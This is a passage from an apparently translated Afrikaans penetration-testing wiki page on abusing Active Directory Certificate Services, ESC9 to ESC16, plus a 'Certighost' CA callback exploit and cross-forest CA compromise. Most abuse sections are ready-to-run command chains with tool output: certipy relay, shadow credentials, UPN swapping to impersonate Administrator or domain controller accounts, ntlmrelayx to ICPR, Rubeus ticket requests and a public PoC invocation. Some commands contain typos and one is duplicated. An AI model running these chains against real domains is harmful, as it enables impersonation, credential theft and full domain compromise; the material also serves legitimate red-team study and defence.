’n Tegniek soos [PetitPotam](https://github.com/ly4k/PetitPotam) kan vervolgens gebruik word om authentication af te dwing. Wanneer domain controllers hanteer word, is die spesifikasie van `-template DomainController` vereis.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Verduideliking

Die nuwe waarde **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) vir **`msPKI-Enrollment-Flag`**, waarna as ESC9 verwys word, verhoed dat die **nuwe `szOID_NTDS_CA_SECURITY_EXT` security extension** in ’n sertifikaat ingebed word. Hierdie flag word relevant wanneer `StrongCertificateBindingEnforcement` op `1` gestel is (die verstekinstelling), in teenstelling met ’n instelling van `2`. Die relevansie daarvan neem toe in scenario’s waar ’n swakker certificate mapping vir Kerberos of Schannel uitgebuit kan word (soos in ESC10), aangesien die afwesigheid van ESC9 nie die vereistes sou verander nie.

Die omstandighede waaronder hierdie flag se instelling belangrik word, sluit die volgende in:

- `StrongCertificateBindingEnforcement` is nie op `2` aangepas nie (die verstekwaarde is `1`), of `CertificateMappingMethods` sluit die `UPN` flag in.
- Die sertifikaat is gemerk met die `CT_FLAG_NO_SECURITY_EXTENSION` flag binne die `msPKI-Enrollment-Flag`-instelling.
- Enige client authentication EKU word deur die sertifikaat gespesifiseer.
- `GenericWrite`-toestemmings is beskikbaar oor enige account om ’n ander een te kompromitteer.

### Misbruikscenario

Veronderstel `John@corp.local` het `GenericWrite`-toestemmings oor `Jane@corp.local`, met die doel om `Administrator@corp.local` te kompromitteer. Die `ESC9` certificate template, waarvoor `Jane@corp.local` toegelaat word om in te skryf, is gekonfigureer met die `CT_FLAG_NO_SECURITY_EXTENSION` flag in sy `msPKI-Enrollment-Flag`-instelling.

Aanvanklik word `Jane` se hash verkry deur Shadow Credentials te gebruik, danksy `John` se `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Daarna word `Jane` se `userPrincipalName` verander na `Administrator`, met die `@corp.local`-domeingedeelte doelbewus weggelaat:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Hierdie wysiging oortree nie beperkings nie, aangesien `Administrator@corp.local` steeds onderskei bly as `Administrator` se `userPrincipalName`.

Hierna word die `ESC9`-sertifikaatsjabloon, wat as kwesbaar gemerk is, as `Jane` aangevra:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Daar word opgemerk dat die sertifikaat se `userPrincipalName` `Administrator` weerspieël, sonder enige “object SID”.

`Jane` se `userPrincipalName` word daarna na haar oorspronklike waarde teruggestel, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Poging tot authentication met die uitgereikte sertifikaat lewer nou die NT-hash van `Administrator@corp.local`. Die opdrag moet `-domain <domain>` insluit weens die sertifikaat se gebrek aan domeinspesifikasie:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Swak Certificate Mappings - ESC10

### Verduideliking

Twee registersleutelwaardes op die domeinbeheerder word deur ESC10 aangedui:

- Die verstekwaarde vir `CertificateMappingMethods` onder `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), voorheen ingestel op `0x1F`.
- Die verstekinstelling vir `StrongCertificateBindingEnforcement` onder `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, voorheen `0`.

**Geval 1**

Wanneer `StrongCertificateBindingEnforcement` as `0` gekonfigureer is.

**Geval 2**

As `CertificateMappingMethods` die `UPN`-bit (`0x4`) insluit.

### Misbruikgeval 1

Met `StrongCertificateBindingEnforcement` gekonfigureer as `0`, kan 'n rekening A met `GenericWrite`-toestemmings uitgebuit word om enige rekening B te kompromitteer.

Byvoorbeeld, met `GenericWrite`-toestemmings oor `Jane@corp.local` mik 'n aanvaller daarna om `Administrator@corp.local` te kompromitteer. Die prosedure stem ooreen met ESC9, wat dit moontlik maak om enige certificate template te gebruik.

Eerstens word Jane se hash met Shadow Credentials verkry deur die `GenericWrite` uit te buit.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Daarna word `Jane` se `userPrincipalName` na `Administrator` verander, met opset sonder die `@corp.local`-gedeelte om ’n beperkingskending te vermy.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Daarna word ’n sertifikaat wat kliëntverifikasie moontlik maak, as `Jane` aangevra met die verstek `User`-template.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word dan na sy oorspronklike waarde, `Jane@corp.local`, teruggestel.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Deur met die verkreë sertifikaat te verifieer, word die NT-hash van `Administrator@corp.local` verkry, wat vereis dat die domein in die opdrag gespesifiseer word omdat die sertifikaat geen domeinbesonderhede bevat nie.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Misbruikgeval 2

Met die `CertificateMappingMethods` wat die `UPN`-bitvlag (`0x4`) bevat, kan ’n rekening A met `GenericWrite`-toestemmings enige rekening B kompromitteer wat nie ’n `userPrincipalName`-eienskap het nie, insluitend masjienrekeninge en die ingeboude domeinadministrateur `Administrator`.

Hier is die doel om `DC$@corp.local` te kompromitteer, deur eers Jane se hash deur middel van Shadow Credentials te bekom en die `GenericWrite` te benut.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane` se `userPrincipalName` word dan gestel op `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
’n Sertifikaat vir kliëntverifikasie word as `Jane` aangevra deur die verstek-`User`-sjabloon te gebruik.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane` se `userPrincipalName` word ná hierdie proses na sy oorspronklike waarde teruggestel.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Om via Schannel te autentiseer, word Certipy se `-ldap-shell`-opsie gebruik, wat aandui dat verifikasie suksesvol was as `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Deur die LDAP-shell maak opdragte soos `set_rbcd` Resource-Based Constrained Delegation (RBCD)-aanvalle moontlik, wat die domeinbeheerder moontlik kan kompromitteer.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Hierdie kwesbaarheid strek ook tot enige gebruikersrekening sonder ’n `userPrincipalName`, of waar dit nie met die `sAMAccountName` ooreenstem nie. Die verstek-`Administrator@corp.local` is ’n belangrike teiken weens sy verhoogde LDAP-voorregte en die afwesigheid van ’n `userPrincipalName` by verstek.

## Relaying NTLM to ICPR - ESC11

### Verduideliking

As die CA Server nie met `IF_ENFORCEENCRYPTICERTREQUEST` gekonfigureer is nie, kan NTLM relay-aanvalle sonder signing via die RPC-diens uitgevoer word. [Verwysing hier](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Jy kan `certipy` gebruik om op te som of `Enforce Encryption for Requests` gedeaktiveer is. certipy sal `ESC11`-kwesbaarhede wys.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Dit vereis dat ’n relay server opgestel word:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Vir domeinbeheerders moet ons `-template` in DomainController spesifiseer.

Of deur [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) te gebruik:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell-toegang tot ADCS CA met YubiHSM - ESC12

### Verduideliking

Administrateurs kan die Certificate Authority opstel om dit op 'n eksterne toestel soos die "Yubico YubiHSM2" te stoor.

As 'n USB-toestel via 'n USB-poort aan die CA-bediener gekoppel is, of aan 'n USB-toestelbediener in geval die CA-bediener 'n virtuele masjien is, word 'n authentication key (soms na verwys as 'n "password") vereis sodat die Key Storage Provider sleutels in die YubiHSM kan genereer en gebruik.

Hierdie key/password word in die register onder `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext gestoor.

Verwysing [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

As die CA se private key op 'n fisiese USB-toestel gestoor word wanneer jy shell access verkry het, is dit moontlik om die key te herwin.

Eerstens moet jy die CA certificate verkry (dit is publiek), en dan:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Uiteindelik, gebruik die certutil `-sign`-opdrag om 'n nuwe arbitrêre sertifikaat te vervals met behulp van die CA-sertifikaat en sy private sleutel.

## OID Group Link Abuse - ESC13

### Verduideliking

Die `msPKI-Certificate-Policy`-kenmerk laat toe dat die uitreikingsbeleid by die sertifikaatsjabloon gevoeg word. Die `msPKI-Enterprise-Oid`-objekte wat verantwoordelik is vir die uitreiking van beleide, kan in die Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) van die PKI OID-container ontdek word. 'n Beleid kan met 'n AD-groep gekoppel word deur hierdie objek se `msDS-OIDToGroupLink`-kenmerk, wat 'n stelsel in staat stel om 'n gebruiker wat die sertifikaat aanbied, te magtig asof hy 'n lid van die groep is. [Verwysing hier](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Met ander woorde, wanneer 'n gebruiker toestemming het om vir 'n sertifikaat in te skryf en die sertifikaat aan 'n OID-groep gekoppel is, kan die gebruiker die voorregte van hierdie groep erf.

Gebruik [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) om OIDToGroupLink te vind:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Misbruikscenario

Vind 'n gebruikerstoestemming wat met `certipy find` of `Certify.exe find /showAllPermissions` gebruik kan word.

As `John` toestemming het om vir `VulnerableTemplate` in te skryf, kan die gebruiker die voorregte van die `VulnerableGroup`-groep oorneem.

Al wat dit moet doen, is om die template te spesifiseer; dit sal 'n sertifikaat met `OIDToGroupLink`-regte kry.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Kwesbare Sertifikaathernuwingskonfigurasie - ESC14

### Verduideliking

Die beskrywing by https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is besonder deeglik. Hieronder volg ’n aanhaling van die oorspronklike teks.

ESC14 spreek kwesbaarhede aan wat voortspruit uit "swak eksplisiete sertifikaatkartering", hoofsaaklik deur die misbruik of onveilige konfigurasie van die `altSecurityIdentities`-kenmerk op Active Directory-gebruiker- of rekenaarrekeninge. Hierdie multivalued-kenmerk stel administrateurs in staat om X.509-sertifikate handmatig aan ’n AD-rekening te koppel vir authentication-doeleindes. Wanneer hierdie eksplisiete karterings ingevul is, kan hulle die versteksertifikaatkarteringslogika oorskryf, wat tipies staatmaak op UPNs of DNS-name in die SAN van die sertifikaat, of die SID wat in die `szOID_NTDS_CA_SECURITY_EXT`-security extension ingebed is.

’n "Swak" kartering kom voor wanneer die stringwaarde wat binne die `altSecurityIdentities`-kenmerk gebruik word om ’n sertifikaat te identifiseer, te breed, maklik voorspelbaar, op nie-unieke sertifikaatvelde gebaseer, of van maklik vervalsbare sertifikaatkomponente afhanklik is. Indien ’n aanvaller ’n sertifikaat kan bekom of skep waarvan die eienskappe met so ’n swak gedefinieerde eksplisiete kartering vir ’n bevoorregte rekening ooreenstem, kan hulle daardie sertifikaat gebruik om as daardie rekening te authenticate en dit te impersonate.

Voorbeelde van potensieel swak `altSecurityIdentities`-karteringstrings sluit in:

- Kartering slegs volgens ’n algemene Subject Common Name (CN): byvoorbeeld `X509:<S>CN=SomeUser`. ’n Aanvaller kan moontlik ’n sertifikaat met hierdie CN vanaf ’n minder veilige bron bekom.
- Gebruik van oormatig generiese Issuer Distinguished Names (DNs) of Subject DNs sonder verdere kwalifikasie, soos ’n spesifieke reeksnommer of subject key identifier: byvoorbeeld `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Gebruik van ander voorspelbare patrone of nie-kriptografiese identifiseerders waaraan ’n aanvaller moontlik kan voldoen in ’n sertifikaat wat hulle wettiglik kan bekom of vervals (indien hulle ’n CA gekompromitteer het of ’n kwesbare template soos in ESC1 gevind het).

Die `altSecurityIdentities`-kenmerk ondersteun verskeie formate vir kartering, soos:

- `X509:<I>IssuerDN<S>SubjectDN` (karteer volgens volledige Issuer- en Subject-DN)
- `X509:<SKI>SubjectKeyIdentifier` (karteer volgens die waarde van die sertifikaat se Subject Key Identifier extension)
- `X509:<SR>SerialNumberBackedByIssuerDN` (karteer volgens reeksnommer, implisiet gekwalifiseer deur die Issuer-DN) - dit is nie ’n standaardformaat nie; gewoonlik is dit `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (karteer volgens ’n RFC822-name, tipies ’n e-posadres, vanaf die SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (karteer volgens ’n SHA1-hash van die sertifikaat se rou public key - oor die algemeen sterk)

Die security van hierdie karterings hang sterk af van die spesifisiteit, uniekheid en kriptografiese sterkte van die gekose sertifikaatidentifiseerders wat in die karteringstring gebruik word. Selfs wanneer sterk certificate binding modes op Domain Controllers geaktiveer is (wat hoofsaaklik implisiete karterings volgens SAN UPNs/DNS en die SID-extension beïnvloed), kan ’n swak gekonfigureerde `altSecurityIdentities`-inskrywing steeds ’n direkte pad vir impersonation bied indien die karteringslogika self gebrekkig of te permissive is.
### Misbruikscenario

ESC14 teiken **eksplisiete sertifikaatkarterings** in Active Directory (AD), spesifiek die `altSecurityIdentities`-kenmerk. Indien hierdie kenmerk gestel is (doelbewus of weens ’n misconfiguration), kan aanvallers rekeninge impersonate deur sertifikate aan te bied wat met die kartering ooreenstem.

#### Scenario A: Aanvaller Kan Na `altSecurityIdentities` Skryf

**Voorvereiste**: Die aanvaller het skryftoestemmings tot die teikenrekening se `altSecurityIdentities`-kenmerk, of die toestemming om dit toe te ken in die vorm van een van die volgende toestemmings op die teiken-AD-object:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Teiken Het Swak Kartering Via X509RFC822 (E-pos)

- **Voorvereiste**: Die teiken het ’n swak X509RFC822-kartering in altSecurityIdentities. ’n Aanvaller kan die slagoffer se mail-kenmerk instel om met die teiken se X509RFC822-name ooreen te stem, ’n sertifikaat as die slagoffer enrolleer, en dit gebruik om as die teiken te authenticate.
#### Scenario C: Teiken Het X509IssuerSubject-Kartering

- **Voorvereiste**: Die teiken het ’n swak X509IssuerSubject-eksplisiete kartering in `altSecurityIdentities`.Die aanvaller kan die `cn`- of `dNSHostName`-kenmerk op ’n slagoffer-principal instel om met die subject van die teiken se X509IssuerSubject-kartering ooreen te stem. Daarna kan die aanvaller ’n sertifikaat as die slagoffer enrolleer en hierdie sertifikaat gebruik om as die teiken te authenticate.
#### Scenario D: Teiken Het X509SubjectOnly-Kartering

- **Voorvereiste**: Die teiken het ’n swak X509SubjectOnly-eksplisiete kartering in `altSecurityIdentities`. Die aanvaller kan die `cn`- of `dNSHostName`-kenmerk op ’n slagoffer-principal instel om met die subject van die teiken se X509SubjectOnly-kartering ooreen te stem. Daarna kan die aanvaller ’n sertifikaat as die slagoffer enrolleer en hierdie sertifikaat gebruik om as die teiken te authenticate.
### konkrete bewerkings
#### Scenario A

Versoek ’n sertifikaat van die sertifikaattemplate `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Stoor en skakel die sertifikaat om
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Verifieer (met die sertifikaat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Opruiming (opsioneel)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Vir meer spesifieke aanvalmetodes in verskeie aanvalscenario's, verwys asseblief na die volgende: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Verduideliking

Die beskrywing by https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc is merkwaardig volledig. Hieronder is 'n aanhaling uit die oorspronklike teks.

Deur ingeboude verstekweergawe 1 certificate templates te gebruik, kan 'n aanvaller 'n CSR saamstel om application policies in te sluit wat voorkeur geniet bo die gekonfigureerde Extended Key Usage-attribute wat in die template gespesifiseer is. Die enigste vereiste is enrollment rights, en dit kan gebruik word om client authentication-, certificate request agent- en codesigning-sertifikate te genereer deur die **_WebServer_**-template te gebruik.

### Misbruik

Die volgende word na [hierdie skakel]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) verwys. Klik om meer gedetailleerde gebruiksmetodes te sien.


Certipy se `find`-opdrag kan help om V1 templates te identifiseer wat moontlik vatbaar is vir ESC15 indien die CA nie gepatch is nie.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direkte Impersonation via Schannel

**Stap 1: Versoek 'n sertifikaat, en voeg die "Client Authentication"-toepassingsbeleid en teiken-UPN in.** Aanvaller `attacker@corp.local` teiken `administrator@corp.local` deur die "WebServer" V1-template te gebruik (wat 'n subject wat deur die enrollee verskaf is, toelaat).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Die kwesbare V1-template met "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Voeg die OID `1.3.6.1.5.5.7.3.2` by die Application Policies-uitbreiding van die CSR.
- `-upn 'administrator@corp.local'`: Stel die UPN in die SAN vir impersonation.

**Stap 2: Authenticate via Schannel (LDAPS) met die verkryde sertifikaat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Stap 1: Versoek ’n certificate van ’n V1-template (met "Enrollee supplies subject"), en voeg "Certificate Request Agent" Application Policy in.** Hierdie certificate is vir die aanvaller (`attacker@corp.local`) om ’n enrollment agent te word. Geen UPN word hier vir die aanvaller se eie identiteit gespesifiseer nie, aangesien die doel die agent-vermoë is.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Voeg OID `1.3.6.1.4.1.311.20.2.1` in.

**Stap 2: Gebruik die "agent"-sertifikaat om namens ’n geteikende bevoorregte gebruiker ’n sertifikaat aan te vra.** Dit is ’n ESC3-agtige stap wat die sertifikaat van Stap 1 as die agent-sertifikaat gebruik.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Stap 3: Meld aan as die bevoorregte gebruiker deur die "on-behalf-of"-sertifikaat te gebruik.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Verduideliking

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** verwys na die scenario waar, indien die konfigurasie van AD CS nie die insluiting van die **szOID_NTDS_CA_SECURITY_EXT**-extension in alle sertifikate afdwing nie, 'n aanvaller dit kan uitbuit deur:

1. 'n Sertifikaat **sonder SID binding** aan te vra.

2. Hierdie sertifikaat **vir authentication as enige rekening** te gebruik, soos om 'n rekening met hoë privileges (bv. 'n Domain Administrator) te impersonate.

Jy kan ook na hierdie artikel verwys om meer oor die gedetailleerde beginsel te leer:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Misbruik

Die volgende verwys na [hierdie skakel](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Klik om meer gedetailleerde gebruiksmetodes te sien.

Om te identifiseer of die Active Directory Certificate Services (AD CS)-omgewing kwesbaar is vir **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Stap 1: Lees aanvanklike UPN van die slagofferrekening (Opsioneel - vir herstel).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Stap 2: Werk die slagofferrekening se UPN by na die teikenadministrateur se `sAMAccountName`.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Stap 3: (Indien nodig) Verkry geloofsbriewe vir die "slagoffer"-rekening (bv. via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Stap 4: Versoek ’n sertifikaat as die "slagoffer"-gebruiker vanaf _enige geskikte kliëntverifikasie-sjabloon_ (bv. "User") op die ESC16-kwesbare CA.** Omdat die CA kwesbaar is vir ESC16, sal dit die SID-sekuriteitsuitbreiding outomaties uit die uitgereikte sertifikaat weglaat, ongeag die sjabloon se spesifieke instellings vir hierdie uitbreiding. Stel die Kerberos-geloofsbrongkas-omgewingsveranderlike (shell-opdrag):
```bash
export KRB5CCNAME=victim.ccache
```
Versoek dan die sertifikaat:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Stap 5: Herstel die "slagoffer"-rekening se UPN.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Stap 6: Meld aan as die teikenadministrateur.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Verduideliking

**Certighost** misbruik 'n **AD CS enrollment chase / callback path** waar die CA vertrou op versoeker-verskafte request attributes om die identiteit te bepaal wat in die uitgereikte sertifikaat geplaas moet word. In die publieke PoC bevat die vervaardigde request:

- **`cdc`**: aanvaller-beheerde host/IP waarmee die CA sal kontak maak
- **`rmd`**: die **teiken Domain Controller DNS-naam** om na te boots

As die CA daardie chase volg, sal dit oor **SMB/LSA (`445`)** en **LDAP (`389`)** aan die aanvaller koppel. Die aanvaller gebruik 'n **regte masjienrekening** (gewoonlik geskep via die verstek **`ms-DS-MachineAccountQuota`**) sodat die callback-sessie as 'n geldige domain principal authenticate, maar die rogue services gee eerder die identiteitseienskappe van die **teiken DC** terug:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

As die CA **nie die teruggestuurde identiteit kriptografies aan die geauthentiseerde callback-principal bind nie**, kan dit 'n sertifikaat vir die **Domain Controller** uitreik, al het die sessie as die aanvaller-beheerde masjienrekening geauthenticate. Dit maak die bug konseptueel anders as **Certifried**: in plaas daarvan om AD attributes soos `dNSHostName` te herskryf, **vervang die aanvaller identiteitsdata tydens CA callback resolution**.

**Nuttige voorvereistes:**

- Lae-bevoorregte **domain credentials**
- Die vermoë om 'n rekenaarrekening te **skep of te hergebruik**
- Netwerkbereikbaarheid vanaf die **CA** na aanvaller-beheerde **poorte `389` en `445`**
- Kwesbare / ongepatchte CA request path (die Microsoft-opdatering van **14 Julie 2026** het **DC validation for `cdc`** plus 'n **resolved-SID comparison** bygevoeg)

Die gevolglike **`.pfx`** kan dan vir **PKINIT** gebruik word, wat 'n **`.ccache`** en, in die gepubliseerde PoC-flow, die **teiken DC NT hash** oplewer. Dit is normaalweg genoeg vir **volledige domain compromise**.

### Misbruik

Die publieke PoC automatiseer die volledige ketting:

1. Skep of hergebruik 'n aanvaller-beheerde **masjienrekening**.
2. Begin **rogue LDAP- en SMB/LSA-listeners** op `389` en `445`.
3. Dien 'n certificate request in wat aanvaller-beheerde **`cdc`**- en teiken-**`rmd`**-attributes bevat.
4. Laat die CA by die rogue listeners authenticate as die beheerde masjienrekening, maar beantwoord die identity lookups met die **teiken DC**-attributes.
5. Ontvang 'n CA-signed **DC certificate**, en gebruik dit daarna vir **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Nuttige runtime-flags van die PoC:

- `--listener <ip>`: kies uitdruklik die callback-IP wat in `cdc` geadverteer word
- `--computer-name <NAME$>`: hergebruik ’n bestaande masjienrekening in plaas daarvan om ’n nuwe een te skep

**Operasionele notas:**

- Die PoC benodig **root** omdat dit aan **bevoorregte poorte** `389` en `445` bind.
- Suksesvolle exploitation skryf ’n **DC `.pfx`** en **Kerberos `.ccache`** plaaslik.
- Omdat die sertifikaat na ’n **Domain Controller-rekening** karteer, kan opvolgaksies **sertifikaatgebaseerde Kerberos-auth**, **DCSync** en hergebruik van die herwonne **masjien-NT-hash** insluit.

## Kompromittering van Foreste met Sertifikate, Verduidelik in die Passiewe Vorm

### Verbreking van Forest Trusts deur Gekompromitteerde CAs

Die konfigurasie vir **cross-forest enrollment** word relatief eenvoudig gemaak. Die **root CA-sertifikaat** van die resource forest word deur administrateurs aan die **account forests** gepubliseer, en die **enterprise CA**-sertifikate van die resource forest word by die `NTAuthCertificates`- en AIA-containers in elke account forest gevoeg. Om dit te verduidelik, verleen hierdie reëling aan die **CA in die resource forest volledige beheer** oor alle ander forests waarvoor dit PKI bestuur. Indien hierdie CA **deur aanvallers gekompromitteer word**, kan sertifikate vir alle gebruikers in beide die resource- en account forests **deur hulle vervals word**, waardeur die forest se sekuriteitsgrens verbreek word.

### Enrollment-voorregte aan Foreign Principals Verleen

